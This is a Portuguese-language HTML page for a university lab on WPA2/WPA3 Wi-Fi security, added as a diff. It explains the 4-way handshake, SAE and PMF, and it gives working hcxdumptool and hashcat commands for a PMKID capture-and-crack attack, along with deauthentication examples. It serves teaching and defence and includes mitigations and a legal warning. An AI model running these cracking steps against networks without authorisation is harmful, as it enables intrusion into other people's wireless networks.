@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="author" content="Prof. Dr. Laerte Peotta de Melo">
+<title>Lab 03 — Protocolos WPA2/WPA3 | Prof. Dr. Laerte Peotta de Melo</title>
+<style>  :root{
+    --bg:#010503;--bg2:#031208;--panel:rgba(3,18,9,.82);--panel2:rgba(5,28,13,.72);
+    --line:rgba(62,255,132,.22);--line2:rgba(62,255,132,.10);--text:#dcffe8;
+    --muted:#9fd4b4;--green:#39ff7a;--green2:#00d26a;--amber:#ffd166;
+    --red:#ff6b6b;--blue:#64d2ff;
+    --shadow:0 24px 80px rgba(0,0,0,.55),0 0 38px rgba(57,255,122,.08);
+    --radius:22px;--max:1180px;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+  html{scroll-behavior:smooth;}
+  body{min-height:100vh;font-family:Inter,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono",monospace;font-size:16px;line-height:1.75;color:var(--text);background:radial-gradient(circle at 18% 0%,rgba(57,255,122,.16),transparent 27%),radial-gradient(circle at 90% 12%,rgba(0,210,106,.11),transparent 24%),linear-gradient(180deg,#010201 0%,#020704 45%,#031008 100%);overflow-x:hidden;}
+  body::before{content:"";position:fixed;inset:0;background-image:linear-gradient(rgba(57,255,122,.045) 1px,transparent 1px),linear-gradient(90deg,rgba(57,255,122,.045) 1px,transparent 1px);background-size:32px 32px;pointer-events:none;z-index:-2;}
+  body::after{content:"";position:fixed;inset:0;background:linear-gradient(180deg,rgba(0,0,0,.18),rgba(0,0,0,.58));pointer-events:none;z-index:-1;}
+  #matrix-rain{position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:-3;opacity:.62;}
+  a{color:var(--green);text-decoration:none;}
+  a:hover{color:#fff;text-shadow:0 0 10px rgba(57,255,122,.75);}
+  nav{position:sticky;top:0;z-index:100;width:min(calc(100% - 2rem),var(--max));margin:1rem auto 0;padding:.75rem .9rem;display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;background:rgba(2,12,6,.82);border:1px solid var(--line);border-radius:999px;box-shadow:0 16px 45px rgba(0,0,0,.34),inset 0 0 24px rgba(57,255,122,.035);backdrop-filter:blur(16px);}
+  .nav-brand{margin-right:auto;white-space:nowrap;font-size:.82rem;font-weight:900;letter-spacing:.07em;text-transform:uppercase;color:#eafff0;text-shadow:0 0 12px rgba(57,255,122,.3);}
+  .nav-brand span{display:inline;margin-left:.5rem;color:var(--muted);font-weight:600;}
+  nav a{font-size:.78rem;font-weight:800;color:var(--muted);padding:.45rem .72rem;border-radius:999px;border:1px solid transparent;letter-spacing:.05em;text-transform:uppercase;}
+  nav a:hover{color:#051007;background:linear-gradient(135deg,var(--green),var(--green2));border-color:rgba(255,255,255,.14);text-shadow:none;}
+  .hero{width:min(calc(100% - 2rem),var(--max));margin:1.4rem auto 0;padding:2.25rem;background:linear-gradient(180deg,rgba(4,21,10,.92),rgba(3,15,8,.84));border:1px solid var(--line);border-radius:28px;box-shadow:var(--shadow);position:relative;overflow:hidden;}
+  .hero::before,.container::before{content:"● ● ●";position:absolute;top:.75rem;left:1.1rem;color:var(--green);font-size:.78rem;letter-spacing:.45rem;opacity:.85;}
+  .hero::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(57,255,122,.018) 0 1px,transparent 1px 4px),linear-gradient(90deg,rgba(57,255,122,.07),transparent 45%,rgba(57,255,122,.04));pointer-events:none;}
+  .hero>*{position:relative;z-index:1;}
+  .hero-meta{display:inline-flex;align-items:center;gap:.5rem;margin:.2rem 0 1rem;padding:.45rem .75rem;border-radius:999px;border:1px solid rgba(57,255,122,.26);background:rgba(57,255,122,.08);color:#eafff0;font-size:.78rem;font-weight:800;text-transform:uppercase;letter-spacing:.08em;}
+  .hero h1{max-width:980px;margin:0 0 1rem;font-size:clamp(2rem,5vw,4.4rem);line-height:1.05;letter-spacing:-.04em;color:#ecfff1;text-shadow:0 0 24px rgba(57,255,122,.18);}
+  .hero p{max-width:920px;margin:0 0 1.2rem;color:var(--muted);font-size:1rem;}
+  .hero strong{color:#eafff0;}
+  .badge-row{display:flex;gap:.55rem;flex-wrap:wrap;align-items:center;}
+  .badge{display:inline-flex;align-items:center;gap:.4rem;padding:.38rem .75rem;border-radius:999px;font-size:.75rem;font-weight:900;letter-spacing:.045em;text-transform:uppercase;border:1px solid var(--line);background:rgba(57,255,122,.08);color:#dfffe9;}
+  .badge::before{content:"▸";color:var(--green);}
+  .badge-blue{color:#d9f7ff;border-color:rgba(100,210,255,.28);background:rgba(100,210,255,.08);}
+  .badge-green{color:#e4ffe9;border-color:rgba(57,255,122,.28);background:rgba(57,255,122,.10);}
+  .badge-gray{color:var(--muted);border-color:rgba(216,255,231,.18);background:rgba(216,255,231,.045);}
+  .badge-red{color:#ffe4e4;border-color:rgba(255,107,107,.34);background:rgba(255,107,107,.10);}
+  .badge-orange{color:#fff2d0;border-color:rgba(255,209,102,.34);background:rgba(255,209,102,.10);}
+  .stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:1rem;margin:1.65rem 0 0;}
+  .stat{min-height:110px;padding:1rem;border-radius:18px;background:rgba(2,14,7,.78);border:1px solid var(--line2);box-shadow:inset 0 0 24px rgba(57,255,122,.035);}
+  .stat-val{font-size:clamp(1.35rem,3vw,2rem);line-height:1.1;color:#eafff0;font-weight:950;text-shadow:0 0 14px rgba(57,255,122,.2);}
+  .stat-lbl{margin-top:.38rem;color:var(--muted);font-size:.78rem;font-weight:700;}
+  .container{width:min(calc(100% - 2rem),var(--max));max-width:var(--max);margin:1.25rem auto 4rem;padding:2.1rem;background:rgba(2,12,6,.72);border:1px solid rgba(57,255,122,.16);border-radius:28px;box-shadow:var(--shadow);position:relative;backdrop-filter:blur(7px);overflow:hidden;}
+  .aviso{margin:1rem 0 1.4rem;padding:1rem 1.15rem;border-radius:18px;background:rgba(255,209,102,.10);border:1px solid rgba(255,209,102,.34);border-left:4px solid var(--amber);color:#fff1c9;font-size:.92rem;}
+  .sumario{margin:1.4rem 0 2.5rem;padding:1.25rem;border-radius:22px;background:rgba(4,22,10,.78);border:1px solid var(--line);}
+  .sumario h2{margin:0 0 .9rem;color:#eafff0;font-size:1rem;letter-spacing:.08em;text-transform:uppercase;}
+  .sumario ol{list-style:none;padding:0;display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:.75rem;}
+  .sumario li{line-height:1.35;}
+  .sumario a{display:block;min-height:54px;padding:.75rem .85rem;border-radius:16px;border:1px solid rgba(57,255,122,.12);background:rgba(216,255,231,.035);color:var(--muted);font-weight:800;font-size:.84rem;}
+  .sumario a:hover{color:#041108;background:linear-gradient(135deg,var(--green),var(--green2));text-shadow:none;}
+  section{margin-top:2.3rem;padding:1.3rem;border:1px solid rgba(57,255,122,.13);border-radius:24px;background:rgba(4,18,9,.58);box-shadow:inset 0 0 24px rgba(57,255,122,.025);}
+  section h2{display:flex;align-items:center;gap:.65rem;margin:0 0 1rem;padding-bottom:.75rem;border-bottom:1px solid rgba(57,255,122,.18);color:#eafff0;font-size:clamp(1.35rem,2.6vw,2rem);letter-spacing:-.02em;text-transform:uppercase;}
+  section h2::before{content:"▣";color:var(--green);text-shadow:0 0 12px rgba(57,255,122,.75);}
+  section h3{margin:1.4rem 0 .55rem;color:#eafff0;font-size:1.06rem;letter-spacing:.02em;}
+  section h3::before{content:"$ ";color:var(--green);}
+  section h4{margin:1rem 0 .4rem;color:#d5ffe1;font-size:.96rem;}
+  section p{margin:0 0 .75rem;color:#bfe8cd;font-size:.96rem;}
+  .table-wrap{overflow-x:auto;margin:1rem 0;border:1px solid rgba(57,255,122,.16);border-radius:16px;}
+  table{width:100%;border-collapse:collapse;font-size:.88rem;min-width:640px;}
+  th{background:rgba(57,255,122,.10);color:#eafff0;text-align:left;padding:.8rem .9rem;border-bottom:1px solid rgba(57,255,122,.16);font-weight:900;text-transform:uppercase;letter-spacing:.04em;}
+  td{padding:.78rem .9rem;color:#bfe8cd;vertical-align:top;border-bottom:1px solid rgba(57,255,122,.08);}
+  tr:nth-child(even) td{background:rgba(216,255,231,.025);}
+  tr:hover td{background:rgba(57,255,122,.045);}
+  pre{position:relative;overflow-x:auto;margin:.85rem 0 1.1rem;padding:2.3rem 1rem 1rem;border-radius:18px;background:rgba(0,8,3,.92);border:1px solid rgba(57,255,122,.22);box-shadow:inset 0 0 30px rgba(57,255,122,.045),0 16px 44px rgba(0,0,0,.22);}
+  pre::before{content:"terminal";position:absolute;top:.75rem;left:1rem;color:var(--green);font-size:.72rem;font-weight:900;letter-spacing:.12em;text-transform:uppercase;}
+  pre::after{content:"● ● ●";position:absolute;top:.72rem;right:1rem;color:rgba(57,255,122,.75);font-size:.72rem;letter-spacing:.28rem;}
+  code{font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;font-size:.84rem;color:#eafff0;line-height:1.65;}
+  .cm{color:#7cae8e;}.ck{color:#ff7b72;}.cv{color:#79c0ff;}.cs{color:#6dff9f;}.cw{color:#ffd166;}
+  p code,li code,td code{display:inline-block;padding:.08rem .38rem;border-radius:7px;border:1px solid rgba(57,255,122,.14);background:rgba(0,8,3,.64);color:#dfffe9;font-size:.82rem;}
+  ul.lista,ol.lista{padding-left:1.25rem;margin:.5rem 0 1rem;}
+  ul.lista li,ol.lista li{color:#bfe8cd;margin:.25rem 0;}
+  ul.check{list-style:none;padding:0;margin:.85rem 0 1rem;display:grid;gap:.6rem;}
+  ul.check li{display:flex;gap:.65rem;align-items:flex-start;padding:.75rem .85rem;border-radius:15px;background:rgba(216,255,231,.035);border:1px solid rgba(57,255,122,.10);color:#c9f4d7;font-size:.92rem;}
+  ul.check li .ok{color:var(--green);font-weight:900;}
+  ul.check li .nao{color:var(--red);font-weight:900;}
+  .link-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:1rem;margin:1rem 0;}
+  .link-card{min-height:170px;padding:1rem;display:flex;flex-direction:column;gap:.4rem;border-radius:20px;background:rgba(2,14,7,.72);border:1px solid rgba(57,255,122,.14);transition:transform .2s ease,border-color .2s ease,box-shadow .2s ease;}
+  .link-card:hover{transform:translateY(-3px);border-color:rgba(57,255,122,.36);box-shadow:0 18px 44px rgba(0,0,0,.28),0 0 24px rgba(57,255,122,.08);}
+  .link-card .lc-label{font-size:.7rem;font-weight:900;color:var(--green);letter-spacing:.1em;text-transform:uppercase;}
+  .link-card .lc-title{color:#eafff0;font-size:.96rem;font-weight:900;}
+  .link-card .lc-desc{flex:1;color:var(--muted);font-size:.84rem;}
+  .link-card a.lc-link{margin-top:.4rem;font-size:.82rem;font-weight:900;color:#041108;background:linear-gradient(135deg,var(--green),var(--green2));padding:.55rem .7rem;border-radius:999px;text-align:center;}
+  .flow{display:flex;align-items:center;gap:.55rem;flex-wrap:wrap;margin:1rem 0;padding:1rem;border-radius:18px;background:rgba(0,8,3,.5);border:1px solid rgba(57,255,122,.14);}
+  .flow-step{padding:.55rem .85rem;border-radius:999px;background:rgba(57,255,122,.09);border:1px solid rgba(57,255,122,.20);color:#eafff0;font-size:.84rem;font-family:'SFMono-Regular',Consolas,monospace;font-weight:900;}
+  .flow-arr{color:var(--green);font-size:1.1rem;}
+  footer{width:min(calc(100% - 2rem),var(--max));margin:0 auto 2rem;padding:1.2rem;border:1px solid rgba(57,255,122,.13);border-radius:20px;background:rgba(2,12,6,.72);color:var(--muted);text-align:center;font-size:.84rem;}
+  @media(max-width:980px){nav{border-radius:24px;}.nav-brand{width:100%;white-space:normal;}.nav-brand span{display:block;margin:.2rem 0 0;}.stats{grid-template-columns:repeat(2,minmax(0,1fr));}.sumario ol{grid-template-columns:repeat(2,minmax(0,1fr));}.link-grid{grid-template-columns:repeat(2,minmax(0,1fr));}}
+  @media(max-width:640px){body{font-size:15px;}nav,.hero,.container,footer{width:min(calc(100% - 1rem),var(--max));}.hero,.container{padding:1.25rem;border-radius:22px;}.hero h1{font-size:2rem;}.stats,.sumario ol,.link-grid{grid-template-columns:1fr;}nav a{flex:1 1 auto;text-align:center;}}</style>
+</head>
+<body>
+<canvas id="matrix-rain" aria-hidden="true"></canvas>
+<nav>
+  <div class="nav-brand">Prof. Dr. Laerte Peotta de Melo <span>Professor • Pesquisador • Segurança Cibernética • Redes</span></div>
+  <a href="index.html">← Todos os Labs</a>
+  <a href="#objetivo">Objetivo</a>
+  <a href="#historico">Histórico</a>
+  <a href="#wpa2">WPA2</a>
+  <a href="#wpa3">WPA3</a>
+  <a href="#pmkid">PMKID</a>
+  <a href="#atividades">Atividades</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-meta">🔐 Laboratório 03 · Protocolos e Criptografia</div>
+  <h1>Análise de Protocolos WPA2 e WPA3</h1>
+  <p>Estudo aprofundado dos mecanismos de autenticação 802.11: 4-Way Handshake WPA2-PSK, SAE/Dragonfly (WPA3), Protected Management Frames (PMF) e o ataque PMKID sem cliente associado.</p>
+  <div class="badge-row">
+    <span class="badge badge-blue">WPA2-CCMP · WPA3-SAE</span>
+    <span class="badge badge-blue">4-Way Handshake</span>
+    <span class="badge badge-blue">PMF · IEEE 802.11w</span>
+    <span class="badge badge-green">PMKID · hcxtools</span>
+    <span class="badge badge-red">Somente rede própria/autorizada</span>
+  </div>
+  <div class="stats">
+    <div class="stat"><div class="stat-val">AES-128</div><div class="stat-lbl">Criptografia WPA2</div></div>
+    <div class="stat"><div class="stat-val">SAE</div><div class="stat-lbl">Auth WPA3-Personal</div></div>
+    <div class="stat"><div class="stat-val">PMF</div><div class="stat-lbl">Proteção de mgmt frames</div></div>
+    <div class="stat"><div class="stat-val">PMKID</div><div class="stat-lbl">Captura sem cliente</div></div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="aviso">⚠️ <strong>Aviso legal.</strong> Atividades <strong>somente em redes próprias</strong> ou com autorização explícita. Lei 12.737/2012 e Lei 12.965/2014.</div>
+
+  <div class="sumario">
+    <h2>Sumário</h2>
+    <ol>
+      <li><a href="#objetivo">Objetivo do laboratório</a></li>
+      <li><a href="#historico">Histórico e evolução</a></li>
+      <li><a href="#wpa2">WPA2 — 4-Way Handshake</a></li>
+      <li><a href="#wpa3">WPA3 — SAE e Dragonfly</a></li>
+      <li><a href="#pmf">PMF — Protected Management Frames</a></li>
+      <li><a href="#pmkid">Ataque PMKID (sem cliente)</a></li>
+      <li><a href="#atividades">Atividades avaliativas</a></li>
+    </ol>
+  </div>
+
+  <section id="objetivo">
+    <h2>1. Objetivo do laboratório</h2>
+    <p>Este laboratório analisa os protocolos de segurança Wi-Fi com foco na criptografia, nos mecanismos de autenticação e nas vulnerabilidades de cada geração. O objetivo é compreender <em>por que</em> certos ataques funcionam e como os protocolos mais recentes os mitigam.</p>
+    <h3>Comparativo geral</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Protocolo</th><th>Ano</th><th>Autenticação</th><th>Criptografia</th><th>Vulnerabilidades</th></tr>
+      <tr><td>WEP</td><td>1997</td><td>Open / Shared Key</td><td>RC4 (24-bit IV)</td><td style="color:var(--red)">IV reutilizável, crack em minutos</td></tr>
+      <tr><td>WPA-TKIP</td><td>2003</td><td>PSK / 802.1X</td><td>RC4 + TKIP</td><td style="color:var(--red)">TKIP vulnerável, Chopchop attack</td></tr>
+      <tr><td>WPA2-CCMP</td><td>2004</td><td>PSK / 802.1X</td><td>AES-128 CCMP</td><td style="color:var(--amber)">Handshake offline crack, PMKID, DeAuth</td></tr>
+      <tr><td>WPA3-Personal</td><td>2018</td><td>SAE (Dragonfly)</td><td>AES-128 CCMP</td><td style="color:var(--green)">Forward secrecy, resistente a offline crack</td></tr>
+      <tr><td>WPA3-Enterprise</td><td>2018</td><td>802.1X + EAP</td><td>AES-256 GCMP</td><td style="color:var(--green)">Suite B, PMF obrigatório</td></tr>
+    </table></div>
+  </section>
+
+  <section id="historico">
+    <h2>2. Histórico e evolução dos protocolos</h2>
+    <p>A evolução dos protocolos Wi-Fi foi impulsionada pela descoberta de vulnerabilidades em cada geração anterior.</p>
+    <div class="flow">
+      <div class="flow-step">WEP (1997)</div><div class="flow-arr">→</div>
+      <div class="flow-step">WPA-TKIP (2003)</div><div class="flow-arr">→</div>
+      <div class="flow-step">WPA2-CCMP (2004)</div><div class="flow-arr">→</div>
+      <div class="flow-step">WPA2+PMF (2013)</div><div class="flow-arr">→</div>
+      <div class="flow-step">WPA3-SAE (2018)</div>
+    </div>
+    <h3>Por que o WEP falhou</h3>
+    <p>O WEP usa RC4 com vetores de inicialização (IV) de apenas 24 bits. Com tráfego suficiente, IVs se repetem e permitem recuperar a chave por análise estatística. A ferramenta <code>aircrack-ng</code> quebra WEP em menos de 5 minutos com ~50.000 IVs.</p>
+    <pre><code><span class="cm"># Demonstração: verificar protocolo de um AP</span>
+airodump-ng wlan0mon --bssid AA:BB:CC:77:88:99 -c 1
+
+<span class="cw"> BSSID              ENC   CIPHER  ESSID
+ AA:BB:CC:77:88:99  WEP          OldRouter  ← RISCO CRÍTICO</span>
+
+<span class="cm"># Calcular espaço de chaves WEP vs WPA2</span>
+<span class="cs">WEP  IV: 2^24 = 16.777.216 combinações → colisão garantida
+WPA2 PN: 2^48 → 281 trilhões de combinações → sem colisão prática</span></code></pre>
+  </section>
+
+  <section id="wpa2">
+    <h2>3. WPA2 — 4-Way Handshake em detalhe</h2>
+    <p>O WPA2-PSK deriva a PMK (Pairwise Master Key) a partir da senha e do SSID via PBKDF2-SHA1 (4096 iterações). A PTK (sessão) é derivada via PRF-512 com ANonce, SNonce, MACs do AP e do cliente.</p>
+    <h3>Hierarquia de chaves WPA2</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Chave</th><th>Derivação</th><th>Papel</th></tr>
+      <tr><td>PMK</td><td>PBKDF2(passphrase, SSID, 4096, 32)</td><td>Chave mestre de 256 bits — derivada da senha</td></tr>
+      <tr><td>PTK</td><td>PRF-512(PMK, ANonce, SNonce, MACs)</td><td>Chave de sessão — única por associação</td></tr>
+      <tr><td>KCK</td><td>PTK[0:16]</td><td>Chave de confirmação — usada no MIC do handshake</td></tr>
+      <tr><td>KEK</td><td>PTK[16:32]</td><td>Chave de encriptação — protege GTK no M3</td></tr>
+      <tr><td>TK</td><td>PTK[32:48]</td><td>Chave de tráfego — encripta frames de dados</td></tr>
+      <tr><td>GTK</td><td>Gerada pelo AP</td><td>Chave de grupo — encripta broadcasts/multicasts</td></tr>
+    </table></div>
+    <h3>Sequência do 4-Way Handshake</h3>
+    <pre><code><span class="cm">AP                                        Cliente
+│                                              │
+│ ── M1: EAPOL (ANonce) ──────────────────→   │
+│    ANonce = nonce aleatório do AP            │
+│                                              │
+│    (Cliente deriva PTK = PRF(PMK,            │
+│         ANonce, SNonce, MAC_AP, MAC_Cli))    │
+│                                              │
+│ ←── M2: EAPOL (SNonce + MIC) ───────────   │
+│    SNonce = nonce aleatório do cliente       │
+│    MIC = HMAC-SHA1(KCK, M2) ← prova a PMK  │
+│                                              │
+│    (AP verifica MIC, deriva mesma PTK)       │
+│                                              │
+│ ── M3: EAPOL (GTK encriptada + MIC) ──→    │
+│    GTK encriptada com KEK                    │
+│                                              │
+│ ←── M4: EAPOL (ACK + MIC) ──────────────   │
+│    Handshake concluído — tráfego inicia      │</span></code></pre>
+    <h3>Observar handshake no Wireshark</h3>
+    <pre><code><span class="cm"># Filtro para os 4 frames EAPOL</span>
+eapol
+
+<span class="cm"># Inspecionar MIC do M2 — campo crítico para crack offline</span>
+<span class="cm"># Expandir: EAPOL → Key Information → Key MIC</span>
+
+<span class="cm"># Verificar se handshake completo (4 mensagens)</span>
+tshark -r captura.pcap -Y "eapol" -T fields   -e frame.number -e eapol.keydes.key_info | wc -l
+<span class="cs">4   ← 4 mensagens EAPOL capturadas</span></code></pre>
+  </section>
+
+  <section id="wpa3">
+    <h2>4. WPA3 — SAE e Dragonfly Key Exchange</h2>
+    <p>O WPA3-Personal substitui o handshake PSK pelo protocolo <strong>SAE (Simultaneous Authentication of Equals)</strong>, baseado no Dragonfly Key Exchange. O SAE provê <strong>Perfect Forward Secrecy</strong>: mesmo com a senha, não é possível decriptar capturas antigas.</p>
+    <h3>Diferenças fundamentais WPA2 vs WPA3</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Aspecto</th><th>WPA2-PSK</th><th>WPA3-SAE</th></tr>
+      <tr><td>Autenticação</td><td>Baseada em PMK derivada da senha</td><td>Prova de conhecimento zero (DH + senha)</td></tr>
+      <tr><td>Forward Secrecy</td><td>Não — captura + senha = decriptação total</td><td>Sim — chave de sessão não derivável da senha</td></tr>
+      <tr><td>Offline crack</td><td>Possível com handshake + dicionário</td><td>Inviável — SAE protege contra ataques offline</td></tr>
+      <tr><td>PMF</td><td>Opcional (desde 802.11w-2009)</td><td>Obrigatório</td></tr>
+      <tr><td>Transition Mode</td><td>—</td><td>WPA3-SAE/WPA2 simultâneo para compatibilidade</td></tr>
+    </table></div>
+    <h3>Verificar WPA3 em captura</h3>
+    <pre><code><span class="cm"># Identificar APs com WPA3 (AKM Suite = SAE)</span>
+tshark -r captura.pcap -Y "wlan.fc.type_subtype==8"   -T fields -e wlan.ssid -e wlan.rsn.akms.type | grep -E "^.+\s+8$"
+
+<span class="cm"># AKM type 8 = SAE (WPA3-Personal)
+# AKM type 2 = PSK (WPA2-Personal)
+# AKM type 1 = 802.1X (Enterprise)</span>
+
+<span class="cm"># Verificar se PMF está obrigatório no AP</span>
+<span class="cm"># Campo RSN Capabilities: bit 6 (MFPR) = 1 → obrigatório</span>
+tshark -r captura.pcap -Y "wlan.fc.type_subtype==8"   -T fields -e wlan.ssid -e wlan.rsn.capabilities.mfpr
+
+<span class="cs">LabNet3    1    ← PMF obrigatório (WPA3)</span>
+<span class="cs">LabNet2    0    ← PMF opcional (WPA2)</span></code></pre>
+  </section>
+
+  <section id="pmf">
+    <h2>5. PMF — Protected Management Frames (802.11w)</h2>
+    <p>O PMF protege frames de gerenciamento (Deauthentication, Disassociation) contra falsificação. Sem PMF, qualquer um pode enviar frames de desautenticação forjados — base dos ataques DeAuth.</p>
+    <pre><code><span class="cm"># Verificar suporte a PMF no adaptador</span>
+iw list | grep -A5 "Device supports"
+<span class="cs">Device supports: AP, station, IBSS, monitor, P2P-GO, P2P-client
+                 HT, VHT, MFP (802.11w)</span>
+
+<span class="cm"># Ativar PMF no hostapd (Access Point)</span>
+<span class="cm"># /etc/hostapd/hostapd.conf</span>
+<span class="cv">ieee80211w=2</span>   <span class="cm"># 0=desabilitado 1=opcional 2=obrigatório</span>
+
+<span class="cm"># Efeito do PMF sobre o ataque DeAuth</span>
+<span class="cm"># Sem PMF: aireplay-ng -0 5 ... → cliente desconecta imediatamente</span>
+<span class="cm"># Com PMF: aireplay-ng -0 5 ... → cliente ignora o frame falsificado</span>
+<span class="cw">send_deauth: error: No response from AP — PMF ativo, ataque bloqueado</span></code></pre>
+  </section>
+
+  <section id="pmkid">
+    <h2>6. Ataque PMKID — captura sem cliente associado</h2>
+    <p>O PMKID é um identificador derivado da PMK presente no frame EAPOL M1. Diferente do 4-Way Handshake, ele pode ser capturado <strong>sem aguardar nenhum cliente se conectar</strong>, enviando apenas um Request de associação ao AP.</p>
+    <pre><code><span class="cm"># Instalação do hcxdumptool e hcxtools</span>
+apt install -y hcxdumptool hcxtools hashcat
+
+<span class="cm"># Capturar PMKID — solicita associação ao AP (ativo, envia 1 frame)</span>
+hcxdumptool -i wlan0mon -o pmkid.pcapng   --enable_status=1 --filterlist_ap=bssid.txt
+
+<span class="cm"># Converter para formato hashcat</span>
+hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+
+<span class="cm"># Verificar hash capturado</span>
+cat hash.hc22000
+<span class="cs">WPA*02*4d4fe7aac3a2...ef12*aabbcc112233*ddeeff001122*4c6162574946692d4c6162:...</span>
+
+<span class="cm"># Crackear com hashcat + dicionário</span>
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+<span class="cs">4d4fe7aac3a2...ef12:ddeeff001122:aabbcc112233:LabWifi:senha123</span>
+
+<span class="cm"># PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)</span>
+<span class="cm"># Derivado da PMK → vulnerável se a senha estiver em wordlist</span></code></pre>
+
+    <h3>Mitigação do ataque PMKID</h3>
+    <ul class="check">
+      <li><span class="ok">✓</span><span>Usar senha com <strong>16+ caracteres</strong> gerados aleatoriamente — torna o dicionário inviável</span></li>
+      <li><span class="ok">✓</span><span>Migrar para <strong>WPA3-SAE</strong> — o SAE não usa PMK derivada da senha diretamente</span></li>
+      <li><span class="ok">✓</span><span>Habilitar <strong>PMF obrigatório</strong> (ieee80211w=2) para proteção adicional</span></li>
+    </ul>
+  </section>
+
+  <section id="atividades">
+    <h2>7. Atividades avaliativas</h2>
+    <ul class="check">
+      <li><span class="ok">①</span><span>Configure o AP de laboratório com WPA2-CCMP. Capture o handshake de 4 vias no Wireshark e identifique cada um dos 4 frames EAPOL, descrevendo o conteúdo de ANonce, SNonce e MIC.</span></li>
+      <li><span class="ok">②</span><span>Use tshark para extrair o tipo de AKM Suite de todos os APs capturados. Classifique-os por protocolo (WEP, WPA, WPA2-PSK, WPA2-Enterprise, WPA3-SAE).</span></li>
+      <li><span class="ok">③</span><span>Explique com suas palavras por que o WPA3-SAE elimina o ataque de crack offline de handshake. O que é Perfect Forward Secrecy e como o Dragonfly o implementa?</span></li>
+      <li><span class="ok">④</span><span>Execute o ataque PMKID com hcxdumptool no AP de laboratório (WPA2). Converta para hc22000 e tente recuperar a senha com o wordlist rockyou.txt. Documente o tempo de recuperação.</span></li>
+      <li><span class="ok">⑤</span><span>Configure o AP com PMF obrigatório (ieee80211w=2). Tente executar um ataque de desautenticação e documente o resultado. Compare com o comportamento sem PMF.</span></li>
+    </ul>
+    <div class="link-grid">
+      <div class="link-card">
+        <div class="lc-label">Lab Anterior</div>
+        <div class="lc-title">Lab 02 — Captura Wireshark</div>
+        <div class="lc-desc">Captura e análise de frames 802.11 e EAPOL.</div>
+        <a class="lc-link" href="lab02-captura.html">← Voltar</a>
+      </div>
+      <div class="link-card">
+        <div class="lc-label">Próximo Lab</div>
+        <div class="lc-title">Lab 04 — Ataques e Defesa</div>
+        <div class="lc-desc">DeAuth, Evil Twin, WPS e contramedidas práticas.</div>
+        <a class="lc-link" href="lab04-ataques.html">Avançar →</a>
+      </div>
+      <div class="link-card">
+        <div class="lc-label">RFC</div>
+        <div class="lc-title">IEEE 802.11i (WPA2)</div>
+        <div class="lc-desc">Especificação do amendment de segurança RSN/WPA2.</div>
+        <a class="lc-link" href="https://standards.ieee.org/ieee/802.11i/3127/" target="_blank">ieee.org ↗</a>
+      </div>
+      <div class="link-card">
+        <div class="lc-label">Índice</div>
+        <div class="lc-title">Todos os laboratórios</div>
+        <div class="lc-desc">Retornar à página inicial da série.</div>
+        <a class="lc-link" href="index.html">← Índice</a>
+      </div>
+    </div>
+  </section>
+</div>
+<footer>Laboratório 03 · Prof. Dr. Laerte Peotta de Melo • <a href="https://peotta.github.io">peotta.github.io</a> • <a href="https://github.com/peotta/lab-wifi" target="_blank">github.com/peotta/lab-wifi ↗</a></footer>
+<script>(function(){const canvas=document.getElementById("matrix-rain");if(!canvas)return;const ctx=canvas.getContext("2d");const chars="01アイウエオカキクケコABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&*+-/<>{}[]";let width,height,columns,drops,fontSize;function resize(){width=canvas.width=window.innerWidth;height=canvas.height=window.innerHeight;fontSize=Math.max(13,Math.floor(width/105));columns=Math.floor(width/fontSize);drops=Array.from({length:columns},()=>Math.floor(Math.random()*height/fontSize));ctx.font=fontSize+"px Consolas,monospace";}function draw(){ctx.fillStyle="rgba(1,5,3,0.105)";ctx.fillRect(0,0,width,height);ctx.font=fontSize+"px Consolas,monospace";for(let i=0;i<drops.length;i++){const text=chars.charAt(Math.floor(Math.random()*chars.length));const x=i*fontSize;const y=drops[i]*fontSize;ctx.fillStyle=Math.random()>.985?"rgba(220,255,232,.62)":"rgba(57,255,122,.32)";ctx.shadowColor="rgba(57,255,122,.22)";ctx.shadowBlur=7;ctx.fillText(text,x,y);ctx.shadowBlur=0;if(y>height&&Math.random()>.972)drops[i]=0;drops[i]+=1;}requestAnimationFrame(draw);}window.addEventListener("resize",resize);resize();draw();})();</script>
+</body></html>
